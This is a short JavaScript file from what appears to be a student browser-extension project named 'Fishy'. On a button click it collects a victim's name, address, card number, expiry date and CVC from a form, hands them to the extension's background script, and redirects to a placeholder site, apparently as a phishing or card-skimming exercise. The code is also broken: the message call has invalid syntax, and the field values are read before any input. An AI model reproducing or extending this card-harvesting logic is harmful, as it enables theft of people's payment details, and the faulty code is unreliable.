console.log("Je suis là!");
const background = "file:///D:/Users/Philippe/Ada%20Tech%20School/Code/Projets/Janvier/Fishy/background.js";

const button = document.getElementById("button");
const personalInfo = {};
const cardInfo = {};

let firstName = document.getElementById("firstname").value;
let lastName = document.getElementById("lastname").value;
let address = document.getElementById("address").value;
let country = document.getElementById("country").value;
let zipcode = document.getElementById("zipcode").value;
let city = document.getElementById("city").value;
let cardName = document.getElementById("name").value;
let cardNo = document.getElementById("cardnumber").value;
let expDate = document.getElementById("expdate").value;
let cvc = document.getElementById("cvc").value;

button.addEventListener("click", function() {
  personalInfo.name = firstName + lastName;
  personalInfo.address = address;
  personalInfo.country = country;
  personalInfo.zipcode = zipcode;
  personalInfo.city = city;
  cardInfo.name = cardName;
  cardInfo.cardNo = cardNo;
  cardInfo.expDate = expDate;
  cardInfo.cvc = cvc;

  console.log(personalInfo);
  console.log(cardInfo);

  chrome.runtime.sendMessage(("background") {
    message: "cstdata",
    data1: personalInfo,
    data2 : cardInfo
  });

  window.open("https://www.youraddress.com", "_self");
})
